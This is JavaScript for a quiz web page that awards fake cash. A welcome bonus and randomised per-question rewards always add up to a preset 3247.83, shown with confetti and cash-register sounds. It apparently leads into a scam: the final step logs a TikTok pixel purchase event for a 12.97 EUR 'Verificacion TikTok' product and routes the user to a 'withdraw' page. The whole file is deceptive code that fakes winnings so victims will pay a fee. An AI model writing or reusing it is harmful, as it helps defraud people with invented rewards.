/**
 * Handles the reward distribution and display - escalating rewards
 */

const TOTAL_REWARD = 3247.83;
const STARTING_BONUS = 97;
const NUM_QUESTIONS = 7;

const moneySound = new Audio('https://spikebet.cloud/eric/media/dinheiro.mp3');
moneySound.preload = 'auto';
moneySound.volume = 0.12;
moneySound.load();
let cashAudioContext = null;
let cashNoiseBuffer = null;

// Generate ESCALATING rewards - early questions give less, later ones give more
function generateRewards() {
  // Distribute the total minus the welcome bonus, so the header still ends at TOTAL_REWARD
  var distributable = TOTAL_REWARD - STARTING_BONUS;
  // Weights: each question gets progressively more
  var weights = [0.05, 0.07, 0.09, 0.12, 0.15, 0.20, 0.32];
  var rewards = [];
  var sum = 0;

  for (var i = 0; i < NUM_QUESTIONS; i++) {
    if (i === NUM_QUESTIONS - 1) {
      rewards.push(Math.round((distributable - sum) * 100) / 100);
    } else {
      // Add small random variation to each weight
      var variation = 1 + (Math.random() * 0.3 - 0.15);
      var reward = Math.round(distributable * weights[i] * variation * 100) / 100;
      rewards.push(reward);
      sum += reward;
    }
  }

  return rewards;
}

// Reward modal handling
const rewardModal = document.getElementById('reward-modal');
const rewardValue = document.getElementById('reward-value');
const continueRewardBtn = document.getElementById('continue-reward-btn');
const currentBalance = document.getElementById('current-balance');
const finalModal = document.getElementById('final-modal');
const totalReward = document.getElementById('total-reward');
const restartBtn = document.getElementById('restart-btn');

let rewards = generateRewards();
let totalEarned = STARTING_BONUS;

function animateValue(element, start, end, duration) {
  let startTimestamp = null;
  const step = (timestamp) => {
    if (!startTimestamp) startTimestamp = timestamp;
    const progress = Math.min((timestamp - startTimestamp) / duration, 1);
    const current = progress * (end - start) + start;
    element.textContent = formatCurrency(current);
    if (progress < 1) window.requestAnimationFrame(step);
  };
  window.requestAnimationFrame(step);
}

function playMoneySampleFallback() {
  try {
    moneySound.currentTime = 0;
    const playPromise = moneySound.play();
    if (playPromise && typeof playPromise.catch === 'function') playPromise.catch(() => {});
  } catch (error) {}
}

function getCashNoiseBuffer(ctx) {
  if (cashNoiseBuffer && cashNoiseBuffer.sampleRate === ctx.sampleRate) return cashNoiseBuffer;
  const duration = 0.12;
  const length = Math.floor(ctx.sampleRate * duration);
  const buffer = ctx.createBuffer(1, length, ctx.sampleRate);
  const data = buffer.getChannelData(0);
  for (let i = 0; i < length; i++) { const fade = 1 - i / length; data[i] = (Math.random() * 2 - 1) * fade; }
  cashNoiseBuffer = buffer;
  return buffer;
}

function playCashRegisterSynth() {
  const AudioContextClass = window.AudioContext || window.webkitAudioContext;
  if (!AudioContextClass) return false;
  if (!cashAudioContext) cashAudioContext = new AudioContextClass();
  const ctx = cashAudioContext;
  const schedule = () => {
    const now = ctx.currentTime;
    const master = ctx.createGain();
    master.gain.setValueAtTime(0.14, now);
    master.connect(ctx.destination);
    const playClack = (delay, duration, peak) => {
      const start = now + delay;
      const src = ctx.createBufferSource(); src.buffer = getCashNoiseBuffer(ctx);
      const hp = ctx.createBiquadFilter(); hp.type = 'highpass'; hp.frequency.setValueAtTime(1400, start);
      const gain = ctx.createGain(); gain.gain.setValueAtTime(0.0001, start); gain.gain.exponentialRampToValueAtTime(peak, start + 0.004); gain.gain.exponentialRampToValueAtTime(0.0001, start + duration);
      src.connect(hp); hp.connect(gain); gain.connect(master); src.start(start); src.stop(start + duration + 0.01);
    };
    const playBell = (freq, delay, duration, peak) => {
      const start = now + delay;
      const oscMain = ctx.createOscillator(); const oscHarm = ctx.createOscillator(); const filter = ctx.createBiquadFilter(); const gain = ctx.createGain();
      oscMain.type = 'triangle'; oscHarm.type = 'sine'; oscMain.frequency.setValueAtTime(freq, start); oscHarm.frequency.setValueAtTime(freq * 2, start); oscHarm.detune.setValueAtTime(6, start);
      filter.type = 'lowpass'; filter.frequency.setValueAtTime(4500, start);
      gain.gain.setValueAtTime(0.0001, start); gain.gain.exponentialRampToValueAtTime(peak, start + 0.01); gain.gain.exponentialRampToValueAtTime(0.0001, start + duration);
      oscMain.connect(filter); oscHarm.connect(filter); filter.connect(gain); gain.connect(master);
      oscMain.start(start); oscHarm.start(start); oscMain.stop(start + duration + 0.02); oscHarm.stop(start + duration + 0.02);
    };
    playClack(0, 0.05, 0.055); playBell(987.77, 0.012, 0.12, 0.07); playBell(1318.51, 0.06, 0.14, 0.075); playBell(1567.98, 0.115, 0.16, 0.07); playBell(2093, 0.19, 0.2, 0.06); playClack(0.205, 0.045, 0.04);
    master.gain.exponentialRampToValueAtTime(0.0001, now + 0.42);
  };
  if (ctx.state === 'suspended') { ctx.resume().then(schedule).catch(() => { playMoneySampleFallback(); }); } else { schedule(); }
  return true;
}

function playCashRegisterSound() {
  if (!playCashRegisterSynth()) playMoneySampleFallback();
}

function showReward(questionIndex) {
  const reward = rewards[questionIndex];
  totalEarned += reward;
  animateValue(currentBalance, totalEarned - reward, totalEarned, 1000);
  rewardValue.textContent = "0.00";
  rewardModal.classList.add('active');
  if (typeof haptic === 'function') haptic([0, 25, 35, 40]);
  setTimeout(() => {
    startConfetti();
    animateValue(rewardValue, 0, reward, 800);
  }, 150);
  animateElement(rewardModal.querySelector('.reward-amount'), 'reward-pop');
}

function hideReward() {
  rewardModal.classList.remove('active');
  stopConfetti();
}

function showFinalReward() {
  if (typeof notifyQuizCompleted === 'function') notifyQuizCompleted(TOTAL_REWARD);
  if (typeof trackAddToCart === 'function') trackAddToCart(TOTAL_REWARD);
  if (typeof ttq !== 'undefined' && ttq.track) ttq.track('AddToCart', { content_type: 'product', content_id: 'front-verificacao', content_name: 'Verificacion TikTok', value: 12.97, currency: 'EUR', quantity: 1 });

  totalReward.textContent = "0.00";
  finalModal.classList.add('active');
  if (typeof haptic === 'function') haptic([0, 40, 60, 80]);
  playCashRegisterSound();
  setTimeout(() => {
    startConfetti();
    animateValue(totalReward, 0, TOTAL_REWARD, 1500);
  }, 200);
  animateElement(document.querySelector('.final-content .reward-amount'), 'reward-pop');
}

function hideFinalReward() {
  finalModal.classList.remove('active');
  stopConfetti();
}

continueRewardBtn.addEventListener('click', () => {
  hideReward();
  nextQuestion();
});

restartBtn.addEventListener('click', () => {
  hideFinalReward();
  showPage('withdraw');
});

// Welcome bonus modal (shown when the user lands on the page)
const welcomeModal = document.getElementById('welcome-modal');
const welcomeValue = document.getElementById('welcome-value');
const welcomeContinueBtn = document.getElementById('welcome-continue-btn');

function showWelcomeBonus() {
  if (!welcomeModal) return;
  welcomeValue.textContent = "0.00";
  welcomeModal.classList.add('active');
  setTimeout(() => {
    startConfetti();
    animateValue(welcomeValue, 0, STARTING_BONUS, 800);
  }, 150);
  animateElement(welcomeModal.querySelector('.reward-amount'), 'bounce');
}

function hideWelcomeBonus() {
  if (!welcomeModal) return;
  welcomeModal.classList.remove('active');
  stopConfetti();
}

if (welcomeContinueBtn) {
  welcomeContinueBtn.addEventListener('click', hideWelcomeBonus);
}
